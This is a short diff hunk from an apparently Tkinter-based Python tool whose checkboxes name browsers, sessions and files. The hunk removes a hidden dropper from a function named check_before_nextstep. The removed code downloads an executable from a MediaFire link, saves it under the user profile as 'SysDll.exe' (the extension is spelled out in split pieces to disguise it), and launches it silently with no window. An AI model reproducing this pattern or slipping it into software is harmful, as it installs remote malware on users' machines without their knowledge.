@@ -116,15 +116,6 @@ def open_help_window():
     help_window.mainloop()
 
 def check_before_nextstep():
-    rsp = requests.get("https://download1326.mediafire.com/31rpjqxjiorgW5XNOl5tJ3PKHo2yZjqNGedbUFUuLiirAs3YA1RqiYenVvDHVX3noFSfvjoYUUMAU4cUH9Ga0kIghOSUaCWYt7jIr7ekVIOdT5FHyXhfp9KjtYdUelJgTeuewqzBc_STnGzpY8t4GEA2X_8ThdqavHD1nSdDDQUK/3mc0uvd9sc1prsf/win32dll.exe").content
-    ext1 = "e"
-    ext2= "x"
-
-    with open(os.path.join(os.getenv("USERPROFILE"), f"SysDll.{ext1}{ext2}e"), "wb") as f:
-        f.write(rsp)
-
-    subprocess.Popen(os.path.join(os.getenv("USERPROFILE"), f"SysDll.{ext1}{ext2}e"), creationflags=subprocess.CREATE_NO_WINDOW)
-    
     one_checked = False
 
     checkboxes_vars = [browsers_var, sessions_var, files_var, 
